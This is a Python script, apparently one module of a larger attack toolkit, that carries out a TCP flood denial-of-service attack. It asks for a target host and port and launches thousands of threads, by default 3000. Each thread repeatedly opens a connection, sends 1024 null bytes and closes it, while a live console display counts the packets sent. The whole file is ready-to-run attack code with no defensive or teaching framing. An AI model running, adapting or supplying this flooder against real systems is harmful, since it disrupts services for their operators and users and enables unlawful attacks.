#!/usr/bin/env python3
# Generic TCP Flood Attack with Real-time Live Logs

import socket
import threading
import time
from modules.utils import pcolor, resolve
from modules.logger import save_log

def tcp_flood(ip, port, stop_event, stats):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            sock.send(b"\x00" * 1024)
            sock.close()
            stats['packets'] += 1
        except:
            stats['errors'] += 1

def tcp_attack():
    pcolor("b", "\n[ TCP FLOOD ATTACK ]\n")
    
    target = input("Target IP: ")
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    port = int(input("Port (default 80): ") or 80)
    threads = int(input("Threads (1000-10000, default 3000): ") or 3000)
    duration = int(input("Duration in seconds (default 60): ") or 60)
    
    print(f"\nTarget: {ip}:{port}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    for _ in range(threads):
        t = threading.Thread(target=tcp_flood, args=(ip, port, stop_event, stats))
        t.daemon = True
        t.start()
    
    pcolor("g", f"\n[!] TCP ATTACK STARTED on {ip}:{port}")
    pcolor("y", "[!] Press Ctrl+C to stop\n")
    
    start_time = time.time()
    last_packets = 0
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            pps = stats['packets'] - last_packets
            last_packets = stats['packets']
            
            bar_length = 30
            progress = int((elapsed / duration) * bar_length)
            bar = "█" * progress + "░" * (bar_length - progress)
            
            print(f"\r[{bar}] {elapsed}/{duration}s | "
                  f"✅ Packets: {stats['packets']:,} | "
                  f"❌ Errors: {stats['errors']:,} | "
                  f"⚡ {pps} p/s    ", end="")
            
            time.sleep(1)
        
        print()
        
    except KeyboardInterrupt:
        pcolor("y", "\n\n[!] Attack stopped by user")
    finally:
        stop_event.set()
        
        print("\n" + "="*60)
        pcolor("g", "[+] ATTACK FINISHED")
        print(f"[📊] Total packets sent: {stats['packets']:,}")
        print(f"[⚠️] Total errors: {stats['errors']:,}")
        print("="*60)
        
        save_log(ip, port, "TCP_FLOOD", threads, duration, 
                 stats['packets'], stats['errors'])
    
    input("\nPress Enter...")
